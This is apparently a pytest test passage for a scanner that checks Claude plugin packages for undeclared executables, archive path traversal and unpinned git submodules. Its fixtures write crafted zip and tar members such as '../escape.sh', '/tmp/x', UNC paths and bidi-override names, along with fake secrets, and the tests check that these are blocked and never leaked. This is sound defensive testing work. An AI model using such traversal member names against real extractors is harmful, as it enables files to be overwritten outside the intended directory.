    (root / ".mcp.json").write_text("[]\n", encoding="utf-8")
    (root / "mcp.json").write_text("{not-json\n", encoding="utf-8")
    (root / ".claude-plugin" / "marketplace.json").write_text(
        json.dumps({"mcpServers": ["stdio"]}),
        encoding="utf-8",
    )
    (root / "hooks" / "empty.txt").write_text("", encoding="utf-8")
    (root / "hooks.json").write_text(
        json.dumps(
            {
                "mcp_servers": {
                    "broken": "stdio",
                    "empty-url": {"url": "", "command": ""},
                    "listed": ["python"],
                    "remote": {"url": "https://mcp.example.invalid/ok"},
                }
            }
        ),
        encoding="utf-8",
    )
    extra_command = root / "commands" / "run.py"
    extra_command.parent.mkdir()
    extra_command.write_text("print(1)\n", encoding="utf-8")

    inventory = inventory_claude_plugin_capabilities(root)
    hits = scan_claude_plugin_package(root)

    assert inventory["mcp_remote_connect"] is True
    assert inventory["mcp_server_start"] is False
    assert inventory["process_spawn"] is True
    assert all(isinstance(inventory[key], bool) for key in inventory)
    assert any(hit.rule_id == "claude-plugin-undeclared-executable" for hit in hits)
    assert any(hit.file == "commands/run.py" for hit in hits)


_NESTED_SHA = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
_ARCHIVE_SECRET = "sk-archive-must-not-leak"
_ARCHIVE_TRAVERSAL_RULE = "claude-plugin-archive-path-traversal"
_UNADMITTED_SUBMODULE_RULE = "claude-plugin-unadmitted-submodule"


def _write_zip(path: Path, members: dict[str, bytes]) -> Path:
    """Write a purpose-built zip archive with the given member names."""
    path.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(path, "w") as archive:
        for name, payload in members.items():
            archive.writestr(name, payload)
    return path


def _write_tar(path: Path, members: dict[str, bytes], mode: str = "w") -> Path:
    """Write a purpose-built tar archive with the given member names."""
    path.parent.mkdir(parents=True, exist_ok=True)
    with tarfile.open(path, mode) as archive:
        for name, payload in members.items():
            info = tarfile.TarInfo(name=name)
            info.size = len(payload)
            archive.addfile(info, io.BytesIO(payload))
    return path


def _write_gitmodules(root: Path, path: str, url: str, *, branch: str | None = None) -> None:
    """Write a nested submodule pointer without inventing a Git SHA."""
    lines = [
        f'[submodule "{path}"]',
        f"\tpath = {path}",
        f"\turl = {url}",
    ]
    if branch is not None:
        lines.append(f"\tbranch = {branch}")
    lines.append("")
    (root / ".gitmodules").write_text("\n".join(lines), encoding="utf-8")


def _write_gitlink(root: Path, submodule_path: str, sha: str) -> Path:
    """Materialize a gitlink via gitdir HEAD recording ``sha``."""
    nested = root / submodule_path
    nested.mkdir(parents=True, exist_ok=True)
    gitdir = root / ".git" / "modules" / Path(submodule_path)
    gitdir.mkdir(parents=True, exist_ok=True)
    (gitdir / "HEAD").write_text(sha + "\n", encoding="utf-8")
    relative_gitdir = Path(os_relpath(gitdir, nested))
    (nested / ".git").write_text(f"gitdir: {relative_gitdir.as_posix()}\n", encoding="utf-8")
    return nested


def os_relpath(target: Path, start: Path) -> str:
    """Return a POSIX relative path from ``start`` to ``target``."""
    import os

    return Path(os.path.relpath(target, start)).as_posix()


def _write_nested_plugin(nested: Path, sha: str) -> None:
    """Write a pinned licensed nested plugin.json under ``nested``."""
    _write_marketplace(
        nested,
        {
            "name": "nested",
            "version": "1.0.0",
            "source": {
                "source": "github",
                "repo": "example/nested",
                "ref": sha,
            },
        },
        name="plugin.json",
    )
    (nested / "LICENSE").write_text("MIT\n", encoding="utf-8")


def test_zip_parent_escape_member_fails_closed_and_is_not_extracted(
    tmp_path: Path,
) -> None:
    """Zip members named ``../escape.sh`` must not leave the extract root."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        inspect_claude_plugin_archive,
        scan_claude_plugin_package,
    )

    root = _pinned_plugin(tmp_path / "plugin")
    archive = _write_zip(
        root / "payload.zip",
        {"../escape.sh": f"#!/bin/sh\necho {_ARCHIVE_SECRET}\n".encode()},
    )
    escaped = tmp_path / "escape.sh"

    hits = inspect_claude_plugin_archive(archive, root)
    package_hits = scan_claude_plugin_package(root)
    receipt = build_claude_plugin_scan_receipt(root)
    snippets = [hit.snippet for hit in (*hits, *package_hits)]
    serialized = json.dumps(receipt.as_dict())

    assert any(hit.rule_id == _ARCHIVE_TRAVERSAL_RULE for hit in hits)
    assert any(hit.rule_id == _ARCHIVE_TRAVERSAL_RULE for hit in package_hits)
    assert all("_" in hit.rule_id or "-" in hit.rule_id for hit in hits)
    assert not escaped.exists()
    assert receipt.scan_result == "fail"
    assert _ARCHIVE_TRAVERSAL_RULE in receipt.finding_summary
    assert _ARCHIVE_SECRET not in serialized
    assert all(_ARCHIVE_SECRET not in snippet for snippet in snippets)
    assert all("\u202e" not in snippet for snippet in snippets)


def test_tar_absolute_member_fails_closed_and_is_not_extracted(
    tmp_path: Path,
) -> None:
    """Tar members named ``/tmp/x`` must not be followed as plugin content."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        inspect_claude_plugin_archive,
        scan_claude_plugin_package,
    )

    root = _pinned_plugin(tmp_path / "plugin")
    archive = _write_tar(
        root / "payload.tar",
        {"/tmp/x": f"{_ARCHIVE_SECRET}\n".encode()},
    )
    absolute = Path("/tmp/x")
    existed = absolute.exists()
    before = absolute.read_bytes() if existed else None

    hits = inspect_claude_plugin_archive(archive, root)
    package_hits = scan_claude_plugin_package(root)
    receipt = build_claude_plugin_scan_receipt(root)

    assert any(hit.rule_id == _ARCHIVE_TRAVERSAL_RULE for hit in hits)
    assert any(hit.rule_id == _ARCHIVE_TRAVERSAL_RULE for hit in package_hits)
    assert receipt.scan_result == "fail"
    if existed:
        assert absolute.read_bytes() == before
    else:
        assert not absolute.exists()
    assert _ARCHIVE_SECRET not in json.dumps(receipt.as_dict())
    assert all(_ARCHIVE_SECRET not in hit.snippet for hit in (*hits, *package_hits))


def test_archive_windows_prefix_and_nested_dotdot_fail_closed(
    tmp_path: Path,
) -> None:
    """Windows prefixes and nested ``..`` members are traversal, not content."""
    from appguardrail_core.claude_plugin_detector import inspect_claude_plugin_archive

    root = _pinned_plugin(tmp_path / "plugin")
    windows_zip = _write_zip(
        root / "windows.zip",
        {"C:\\Windows\\Temp\\x": b"ignored\n", "..\\escape.sh": b"ignored\n"},
    )
    nested_tar = _write_tar(
        root / "nested.tar.gz",
        {"hooks/../../escape.sh": b"ignored\n"},
        mode="w:gz",
    )
    bidi_zip = _write_zip(
        root / "bidi.zip",
        {"..\u202eescape.sh": b"ignored\n"},
    )

    windows_hits = inspect_claude_plugin_archive(windows_zip, root)
    nested_hits = inspect_claude_plugin_archive(nested_tar, root)
    bidi_hits = inspect_claude_plugin_archive(bidi_zip, root)

    assert any(hit.rule_id == _ARCHIVE_TRAVERSAL_RULE for hit in windows_hits)
    assert any(hit.rule_id == _ARCHIVE_TRAVERSAL_RULE for hit in nested_hits)
    assert any(hit.rule_id == _ARCHIVE_TRAVERSAL_RULE for hit in bidi_hits)
    assert all("\u202e" not in hit.snippet for hit in bidi_hits)
    assert not (tmp_path / "escape.sh").exists()


def test_safe_archive_member_is_not_a_traversal_finding(tmp_path: Path) -> None:
    """In-tree archive members may be materialized and are not traversal."""
    from appguardrail_core.claude_plugin_detector import inspect_claude_plugin_archive

    root = _pinned_plugin(tmp_path / "plugin")
    archive = _write_zip(root / "safe.zip", {"hooks/notes.txt": b"hello\n"})
    hits = inspect_claude_plugin_archive(archive, root)
    assert all(hit.rule_id != _ARCHIVE_TRAVERSAL_RULE for hit in hits)
    assert (root / "hooks" / "notes.txt").read_text(encoding="utf-8") == "hello\n"


def test_gitmodules_branch_main_without_sha_fails_closed(tmp_path: Path) -> None:
    """A nested submodule URL on branch main without a SHA fails admission."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        scan_claude_plugin_package,
    )

    root = _pinned_plugin(tmp_path / "plugin")
    _write_gitmodules(
        root,
        "vendor/nested",
        "https://github.com/example/nested.git",
        branch="main",
    )
    (root / "vendor" / "nested").mkdir(parents=True)

    hits = scan_claude_plugin_package(root)
    receipt = build_claude_plugin_scan_receipt(root)

    assert any(hit.rule_id == _UNADMITTED_SUBMODULE_RULE for hit in hits)
    assert receipt.scan_result == "fail"
    assert _UNADMITTED_SUBMODULE_RULE in receipt.finding_summary
    assert all("\u202e" not in hit.snippet for hit in hits)


def test_gitlink_with_admitted_nested_plugin_is_not_unadmitted(
    tmp_path: Path,
) -> None:
    """A full SHA gitlink plus pinned licensed nested plugin.json is negative."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        scan_claude_plugin_package,
    )

    root = _pinned_plugin(tmp_path / "plugin")
    _write_gitmodules(
        root,
        "vendor/nested",
        "https://github.com/example/nested.git",
    )
    nested = _write_gitlink(root, "vendor/nested", _NESTED_SHA)
    _write_nested_plugin(nested, _NESTED_SHA)

    hits = scan_claude_plugin_package(root)
    receipt = build_claude_plugin_scan_receipt(root)

    assert all(hit.rule_id != _UNADMITTED_SUBMODULE_RULE for hit in hits)
    assert receipt.scan_result == "pass"
    assert _UNADMITTED_SUBMODULE_RULE not in receipt.finding_summary


def test_gitlink_sha_without_complete_nested_identity_fails_closed(
    tmp_path: Path,
) -> None:
    """A recorded SHA is not admission when the nested package is incomplete."""
    from appguardrail_core.claude_plugin_detector import scan_claude_plugin_package

    missing_manifest = _pinned_plugin(tmp_path / "missing-manifest")
    _write_gitmodules(
        missing_manifest,
        "vendor/nested",
        "https://github.com/example/nested.git",
    )
    _write_gitlink(missing_manifest, "vendor/nested", _NESTED_SHA)
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in scan_claude_plugin_package(missing_manifest)
    )

    floating = _pinned_plugin(tmp_path / "floating")
    _write_gitmodules(
        floating,
        "vendor/nested",
        "https://github.com/example/nested.git",
    )
    nested = _write_gitlink(floating, "vendor/nested", _NESTED_SHA)
    _write_nested_plugin(nested, "main")
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in scan_claude_plugin_package(floating)
    )

    unlicensed = _pinned_plugin(tmp_path / "unlicensed")
    _write_gitmodules(
        unlicensed,
        "vendor/nested",
        "https://github.com/example/nested.git",
    )
    nested = _write_gitlink(unlicensed, "vendor/nested", _NESTED_SHA)
    _write_marketplace(
        nested,
        {
            "name": "nested",
            "source": {"repo": "example/nested", "ref": _NESTED_SHA},
        },
        name="plugin.json",
    )
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in scan_claude_plugin_package(unlicensed)
    )


def test_pinned_licensed_plugin_still_passes_archive_submodule_rules(
    tmp_path: Path,
) -> None:
    """Existing pinned licensed plugins stay a pass without archives or gitlinks."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        inventory_claude_plugin_capabilities,
        scan_claude_plugin_package,
    )

    root = _licensed_declared_hook(tmp_path, "#!/bin/sh\necho session\n")
    hits = scan_claude_plugin_package(root)
    receipt = build_claude_plugin_scan_receipt(root)
    inventory = inventory_claude_plugin_capabilities(root)

    assert hits == ()
    assert receipt.scan_result == "pass"
    assert receipt.finding_summary == ()
    assert inventory["shell_execution"] is True
    assert all(
        hit.rule_id
        not in {_ARCHIVE_TRAVERSAL_RULE, _UNADMITTED_SUBMODULE_RULE}
        for hit in hits
    )


def test_archive_and_submodule_snippets_omit_secrets_and_bidi(
    tmp_path: Path,
) -> None:
    """Snippets stay labels: no raw archive bytes, secrets, or bidi characters."""
    from appguardrail_core.claude_plugin_detector import (
        inspect_claude_plugin_archive,
        scan_claude_plugin_package,
    )

    root = _pinned_plugin(tmp_path / "plugin")
    archive = _write_zip(
        root / "payload.zip",
        {
            "../escape.sh": f"OPENAI_API_KEY={_ARCHIVE_SECRET}\n".encode(),
            "hooks/\u202ehidden.sh": b"ignored\n",
        },
    )
    _write_gitmodules(
        root,
        "vendor/nested",
        "https://github.com/example/nested.git",
        branch="main",
    )
    hits = (
        *inspect_claude_plugin_archive(archive, root),
        *scan_claude_plugin_package(root),
    )
    snippets = [hit.snippet for hit in hits]
    assert any(hit.rule_id == _ARCHIVE_TRAVERSAL_RULE for hit in hits)
    assert any(hit.rule_id == _UNADMITTED_SUBMODULE_RULE for hit in hits)
    assert all(_ARCHIVE_SECRET not in snippet for snippet in snippets)
    assert all("OPENAI_API_KEY" not in snippet for snippet in snippets)
    assert all("\u202e" not in snippet for snippet in snippets)


def test_archive_submodule_coverage_edges(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Hostile archive and gitlink edges stay fail-closed without leaking bytes."""
    from appguardrail_core import claude_plugin_detector as detector

    root = _pinned_plugin(tmp_path / "plugin")
    assert detector.inspect_claude_plugin_archive(
        root / ".claude-plugin" / "plugin.json", root
    ) == ()
    fake = root / "fake.zip"
    fake.write_text("not-a-zip", encoding="utf-8")
    assert any(
        hit.rule_id == _ARCHIVE_TRAVERSAL_RULE
        for hit in detector.inspect_claude_plugin_archive(fake, root)
    )
    outside_zip = _write_zip(tmp_path / "outside.zip", {"../escape.sh": b"x"})
    outside_hits = detector.inspect_claude_plugin_archive(outside_zip, root)
    assert outside_hits[0].file == "outside.zip"
    assert detector._sanitize_path_snippet("\u202e") == "path"
    assert detector._archive_member_escapes("", root) is True
    assert detector._archive_member_escapes("foo\x00bar", root) is True
    assert detector._archive_member_escapes("\\\\server\\share\\x", root) is True
    assert detector._archive_member_escapes("//server/share/x", root) is True

    _write_zip(root / "dirs.zip", {"hooks/": b"", "hooks\\": b"", "hooks/ok.txt": b"ok\n"})
    dir_hits = detector.inspect_claude_plugin_archive(root / "dirs.zip", root)
    assert all(hit.rule_id != _ARCHIVE_TRAVERSAL_RULE for hit in dir_hits)
    assert (root / "hooks" / "ok.txt").read_text(encoding="utf-8") == "ok\n"

    tar_path = _write_tar(root / "safe.tar", {"hooks/from-tar.txt": b"tar\n"})
    tar_hits = detector.inspect_claude_plugin_archive(tar_path, root)
    assert tar_hits == ()
    assert (root / "hooks" / "from-tar.txt").read_text(encoding="utf-8") == "tar\n"

    dir_tar = root / "dir-only.tar"
    with tarfile.open(dir_tar, "w") as archive:
        info = tarfile.TarInfo(name="hooks")
        info.type = tarfile.DIRTYPE
        archive.addfile(info)
    detector.inspect_claude_plugin_archive(dir_tar, root)

    (root / "hooks").mkdir(exist_ok=True)
    detector.inspect_claude_plugin_archive(
        _write_zip(root / "dir-dest.zip", {"hooks": b"payload"}), root
    )
    linked_notes = root / "notes.txt"
    linked_notes.symlink_to(root / "LICENSE")
    detector.inspect_claude_plugin_archive(
        _write_zip(root / "sym-dest.zip", {"notes.txt": b"new\n"}), root
    )
    detector._extract_archive_member(tar_path, "../escape.sh", root)
    assert detector._bounded_destination(root, "../escape.sh") is None

    original_zipfile = detector.zipfile.ZipFile

    def boom_zip(*args, **kwargs):
        raise zipfile.BadZipFile("bad")

    monkeypatch.setattr(detector.zipfile, "ZipFile", boom_zip)
    assert any(
        hit.rule_id == _ARCHIVE_TRAVERSAL_RULE
        for hit in detector.inspect_claude_plugin_archive(root / "dirs.zip", root)
    )
    monkeypatch.setattr(detector.zipfile, "ZipFile", original_zipfile)

    original_tarfile = detector.tarfile.open

    def boom_tar(*args, **kwargs):
        raise tarfile.TarError("bad")

    monkeypatch.setattr(detector.tarfile, "open", boom_tar)
    assert detector._read_archive_member(tar_path, "hooks/from-tar.txt") is None
    monkeypatch.setattr(detector.tarfile, "open", original_tarfile)

    monkeypatch.setattr(detector.zipfile, "is_zipfile", lambda _path: False)
    monkeypatch.setattr(detector.tarfile, "is_tarfile", lambda _path: False)
    assert detector._read_archive_member(tar_path, "hooks/from-tar.txt") is None
    monkeypatch.setattr(detector.zipfile, "is_zipfile", zipfile.is_zipfile)
    monkeypatch.setattr(detector.tarfile, "is_tarfile", tarfile.is_tarfile)

    original_resolve = Path.resolve

    def resolve(self: Path, *args, **kwargs):
        if self.name == "blocked-resolve":
            raise OSError("resolve")
        return original_resolve(self, *args, **kwargs)

    blocked = tmp_path / "blocked-resolve"
    blocked.mkdir()
    monkeypatch.setattr(Path, "resolve", resolve)
    assert detector._archive_member_escapes("hooks/ok.txt", blocked) is True
    assert detector._bounded_destination(blocked, "hooks/ok.txt") is None
    monkeypatch.setattr(Path, "resolve", original_resolve)

    original_relative_to = Path.relative_to

    def relative_to(self: Path, other, *args, **kwargs):
        if self.name == "escape-rel":
            raise ValueError("outside")
        return original_relative_to(self, other, *args, **kwargs)

    monkeypatch.setattr(Path, "relative_to", relative_to)
    escape_rel = root / "escape-rel"
    escape_rel.write_text("x\n", encoding="utf-8")
    detector._archive_member_escapes("escape-rel", root)
    detector._bounded_destination(root, "escape-rel")
    monkeypatch.setattr(Path, "relative_to", original_relative_to)

    original_write = Path.write_bytes

    def write_bytes(self: Path, data: bytes) -> int:
        if self.name == "ok.txt":
            raise OSError("write")
        return original_write(self, data)

    monkeypatch.setattr(Path, "write_bytes", write_bytes)
    detector._extract_archive_member(root / "dirs.zip", "hooks/ok.txt", root)
    monkeypatch.setattr(Path, "write_bytes", original_write)

    original_is_symlink = Path.is_symlink

    def is_symlink(self: Path) -> bool:
        if self.name in {"payload.zip", "blocked.zip", ".gitmodules"}:
            raise OSError("stat")
        return original_is_symlink(self)

    (root / "blocked.zip").write_bytes(b"PK")
    monkeypatch.setattr(Path, "is_symlink", is_symlink)
    detector._archive_member_names(root / "blocked.zip")
    detector._archive_traversal_hits(root)
    detector._iter_submodules(root)
    monkeypatch.setattr(Path, "is_symlink", original_is_symlink)

    gitmodules_link = _pinned_plugin(tmp_path / "linked-modules")
    (gitmodules_link / ".gitmodules").symlink_to(gitmodules_link / "LICENSE")
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(gitmodules_link)
    )

    broken = _pinned_plugin(tmp_path / "broken-modules")
    (broken / ".gitmodules").write_bytes(b"\xff\xfe")
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(broken)
    )
    (broken / ".gitmodules").write_text("[submodule\n", encoding="utf-8")
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(broken)
    )
    (broken / ".gitmodules").write_text(
        "[core]\n\trepositoryformatversion = 0\n"
        '[submodule "vendor/from-name"]\n\turl = https://example.invalid/n.git\n',
        encoding="utf-8",
    )
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(broken)
    )

    original_read_text = Path.read_text

    def read_text(self: Path, *args, **kwargs):
        if self.name == ".gitmodules":
            raise OSError("read")
        return original_read_text(self, *args, **kwargs)

    monkeypatch.setattr(Path, "read_text", read_text)
    detector._parse_gitmodules(broken / ".gitmodules")
    monkeypatch.setattr(Path, "read_text", original_read_text)

    gitlink_only = _pinned_plugin(tmp_path / "gitlink-only")
    nested_only = gitlink_only / "vendor" / "only"
    nested_only.mkdir(parents=True)
    (nested_only / ".git").write_text(f"{_NESTED_SHA}\n", encoding="utf-8")
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(gitlink_only)
    )

    sha_file = _pinned_plugin(tmp_path / "sha-file")
    _write_gitmodules(
        sha_file, "vendor/nested", "https://github.com/example/nested.git"
    )
    (sha_file / "vendor").mkdir()
    (sha_file / "vendor" / "nested").write_text(f"{_NESTED_SHA}\n", encoding="utf-8")
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(sha_file)
    )

    gitdir_dir = _pinned_plugin(tmp_path / "gitdir-dir")
    _write_gitmodules(
        gitdir_dir, "vendor/nested", "https://github.com/example/nested.git"
    )
    nested_dir = gitdir_dir / "vendor" / "nested"
    nested_dir.mkdir(parents=True)
    (nested_dir / ".git").mkdir()
    (nested_dir / ".git" / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(gitdir_dir)
    )
    (nested_dir / ".git" / "HEAD").write_bytes(b"\xff\xfe")
    detector._gitlink_sha(nested_dir)
    (nested_dir / ".git").rename(nested_dir / ".git-dir")
    (nested_dir / ".git").symlink_to(nested_dir / ".git-dir")
    assert detector._gitlink_sha(nested_dir) == ""
    detector._gitlink_sha(nested_dir / "missing")

    abs_git = _pinned_plugin(tmp_path / "abs-gitdir")
    nested_abs = abs_git / "vendor" / "nested"
    nested_abs.mkdir(parents=True)
    gitdir_abs = tmp_path / "abs-gitdir-store"
    gitdir_abs.mkdir()
    (gitdir_abs / "HEAD").write_text(_NESTED_SHA + "\n", encoding="utf-8")
    (nested_abs / ".git").write_text(f"gitdir: {gitdir_abs}\n", encoding="utf-8")
    assert detector._gitlink_sha(nested_abs) == _NESTED_SHA
    (gitdir_abs / "HEAD").unlink()
    (gitdir_abs / "HEAD").mkdir()
    assert detector._read_head_sha(gitdir_abs) == ""

    mismatch = _pinned_plugin(tmp_path / "mismatch")
    _write_gitmodules(
        mismatch, "vendor/nested", "https://github.com/example/nested.git"
    )
    nested = _write_gitlink(mismatch, "vendor/nested", _NESTED_SHA)
    _write_nested_plugin(nested, "cccccccccccccccccccccccccccccccccccccccc")
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(mismatch)
    )

    sha_field = _pinned_plugin(tmp_path / "sha-field")
    (sha_field / ".gitmodules").write_text(
        '[submodule "vendor/nested"]\n'
        "\tpath = vendor/nested\n"
        "\turl = https://github.com/example/nested.git\n"
        f"\tsha = {_NESTED_SHA}\n",
        encoding="utf-8",
    )
    nested = sha_field / "vendor" / "nested"
    nested.mkdir(parents=True)
    _write_nested_plugin(nested, _NESTED_SHA)
    assert all(
        hit.rule_id != _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(sha_field)
    )

    linked_plugin = _pinned_plugin(tmp_path / "linked-plugin-dir")
    _write_gitmodules(
        linked_plugin, "vendor/nested", "https://github.com/example/nested.git"
    )
    nested = _write_gitlink(linked_plugin, "vendor/nested", _NESTED_SHA)
    real_plugin = tmp_path / "real-nested"
    _write_nested_plugin(real_plugin, _NESTED_SHA)
    (nested / ".claude-plugin").symlink_to(real_plugin / ".claude-plugin")
    (nested / "LICENSE").write_text("MIT\n", encoding="utf-8")
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(linked_plugin)
    )

    nested_escape = _pinned_plugin(tmp_path / "escape-sub")
    _write_gitmodules(
        nested_escape, "../outside", "https://github.com/example/nested.git"
    )
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(nested_escape)
    )
    _write_gitmodules(
        nested_escape, "C:\\nested", "https://github.com/example/nested.git"
    )
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(nested_escape)
    )
    _write_gitmodules(
        nested_escape, "/tmp/nested", "https://github.com/example/nested.git"
    )
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(nested_escape)
    )

    pointer = detector._SubmodulePointer(path="", file=".gitmodules", recorded_sha="")
    assert detector._submodule_is_admitted(root, pointer) is False
    assert (
        detector._unadmitted_submodule_hits(root, _seen=frozenset({root.resolve()}))
        == ()
    )

    original_resolve_root = Path.resolve

    def resolve_root(self: Path, *args, **kwargs):
        if self == root:
            raise OSError("root-resolve")
        return original_resolve_root(self, *args, **kwargs)

    monkeypatch.setattr(Path, "resolve", resolve_root)
    detector._unadmitted_submodule_hits(root)
    monkeypatch.setattr(Path, "resolve", original_resolve_root)

    admitted = _pinned_plugin(tmp_path / "admitted-nested")
    _write_gitmodules(
        admitted, "vendor/nested", "https://github.com/example/nested.git"
    )
    nested = _write_gitlink(admitted, "vendor/nested", _NESTED_SHA)
    _write_nested_plugin(nested, _NESTED_SHA)
    _write_gitmodules(
        nested, "vendor/deep", "https://github.com/example/deep.git", branch="main"
    )
    (nested / "vendor" / "deep").mkdir(parents=True)
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(admitted)
    )

    linked_nested = _pinned_plugin(tmp_path / "linked-nested")
    _write_gitmodules(
        linked_nested,
        "vendor/nested",
        "https://github.com/example/nested.git",
    )
    (linked_nested / "vendor").mkdir()
    (linked_nested / "vendor" / "nested").symlink_to(tmp_path / "plugin")
    (linked_nested / ".gitmodules").write_text(
        '[submodule "vendor/nested"]\n'
        "\tpath = vendor/nested\n"
        f"\tcommit = {_NESTED_SHA}\n",
        encoding="utf-8",
    )
    assert any(
        hit.rule_id == _UNADMITTED_SUBMODULE_RULE
        for hit in detector.scan_claude_plugin_package(linked_nested)
    )

    original_is_dir = Path.is_dir

    def is_dir(self: Path) -> bool:
        if self.name == "nested" and "os-nested" in self.as_posix():
            raise OSError("isdir")
        return original_is_dir(self)

    os_nested = _pinned_plugin(tmp_path / "os-nested")
    _write_gitmodules(
        os_nested, "vendor/nested", "https://github.com/example/nested.git"
    )
    nested = _write_gitlink(os_nested, "vendor/nested", _NESTED_SHA)
    _write_nested_plugin(nested, _NESTED_SHA)
    monkeypatch.setattr(Path, "is_dir", is_dir)
    detector._submodule_is_admitted(
        os_nested,
        detector._SubmodulePointer(
            path="vendor/nested", file=".gitmodules", recorded_sha=_NESTED_SHA
        ),
    )
    monkeypatch.setattr(Path, "is_dir", original_is_dir)

    original_is_file = Path.is_file

    def is_file(self: Path) -> bool:
        if self.name == ".git" and "file-err" in self.as_posix():
            raise OSError("isfile")
        return original_is_file(self)

    file_err = _pinned_plugin(tmp_path / "file-err")
    nested = file_err / "vendor" / "nested"
    nested.mkdir(parents=True)
    (nested / ".git").write_text("gitdir: missing\n", encoding="utf-8")
    monkeypatch.setattr(Path, "is_file", is_file)
    detector._iter_submodules(file_err)
    monkeypatch.setattr(Path, "is_file", original_is_file)

    original_nested_is_symlink = Path.is_symlink

    def nested_is_symlink(self: Path) -> bool:
        if "sha-symlink" in self.as_posix() and self.name == "nested":
            raise OSError("sym")
        return original_nested_is_symlink(self)

    sha_symlink = _pinned_plugin(tmp_path / "sha-symlink")
    monkeypatch.setattr(Path, "is_symlink", nested_is_symlink)
    detector._recorded_sha(
        sha_symlink,
        detector._SubmodulePointer(
            path="vendor/nested", file=".gitmodules", recorded_sha=""
        ),
    )
    monkeypatch.setattr(Path, "is_symlink", original_nested_is_symlink)

    detector._recorded_sha(
        root,
        detector._SubmodulePointer(
            path="missing-nested", file=".gitmodules", recorded_sha=""
        ),
    )

    git_dir_walk = _pinned_plugin(tmp_path / "git-dir-walk")
    nested = git_dir_walk / "vendor" / "nested"
    nested.mkdir(parents=True)
    (nested / ".git").mkdir()
    detector._iter_submodules(git_dir_walk)


def test_archive_submodule_remaining_coverage_edges(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Cover remaining archive open, extract, and gitlink error branches."""
    from appguardrail_core import claude_plugin_detector as detector

    root = _pinned_plugin(tmp_path / "plugin")
    archive_dir = root / "not-a-file.zip"
    archive_dir.mkdir()
    assert detector._archive_member_names(archive_dir) == ((), False)
    link_zip = root / "link.zip"
    link_zip.symlink_to(root / "LICENSE")
    assert detector._archive_member_names(link_zip) == ((), False)

    dir_tar = root / "dir-only.tar"
    with tarfile.open(dir_tar, "w") as archive:
        info = tarfile.TarInfo(name="hooks")
        info.type = tarfile.DIRTYPE
        archive.addfile(info)
    assert detector._read_archive_member(dir_tar, "hooks") is None
    mkdir_zip = _write_zip(root / "mkdir.zip", {"missing-parent/file.txt": b"x"})

    class FakeZip:
        """Zip handle that fails member reads."""

        def __init__(self, *args, **kwargs) -> None:
            """Ignore the underlying path."""

        def __enter__(self):
            """Return the failing handle."""
            return self

        def __exit__(self, *args) -> bool:
            """Do not suppress errors."""
            return False

        def read(self, name: str) -> bytes:
            """Fail closed when a member cannot be read."""
            raise KeyError(name)

        def namelist(self) -> list[str]:
            """Return no members."""
            return []

    original_zipfile_cls = zipfile.ZipFile
    original_is_zipfile = zipfile.is_zipfile
    monkeypatch.setattr(detector.zipfile, "is_zipfile", lambda _path: True)
    monkeypatch.setattr(detector.zipfile, "ZipFile", FakeZip)
    assert detector._read_archive_member(root / "LICENSE", "missing") is None
    monkeypatch.setattr(detector.zipfile, "is_zipfile", original_is_zipfile)
    monkeypatch.setattr(detector.zipfile, "ZipFile", original_zipfile_cls)

    original_mkdir = Path.mkdir

    def mkdir(self: Path, *args, **kwargs):
        if self.name == "missing-parent":
            raise OSError("mkdir")
        return original_mkdir(self, *args, **kwargs)

    monkeypatch.setattr(Path, "mkdir", mkdir)
    detector._extract_archive_member(mkdir_zip, "missing-parent/file.txt", root)
    monkeypatch.setattr(Path, "mkdir", original_mkdir)

    walked = {"done": False}
    original_walk = detector._walk_entries

    def walk(scan_root: Path):
        result = original_walk(scan_root)
        walked["done"] = True
        return result

    original_is_file = Path.is_file

    def is_file(self: Path) -> bool:
        if walked["done"] and self.name == "mkdir.zip":
            raise OSError("stat")
        return original_is_file(self)

    monkeypatch.setattr(detector, "_walk_entries", walk)
    monkeypatch.setattr(Path, "is_file", is_file)
    detector._archive_traversal_hits(root)
    monkeypatch.setattr(detector, "_walk_entries", original_walk)
    monkeypatch.setattr(Path, "is_file", original_is_file)
    walked["done"] = False

    symlink_git = _pinned_plugin(tmp_path / "symlink-git")
    nested = symlink_git / "vendor" / "nested"
    nested.mkdir(parents=True)
    (nested / "git-target").mkdir()
    (nested / ".git").symlink_to(nested / "git-target")
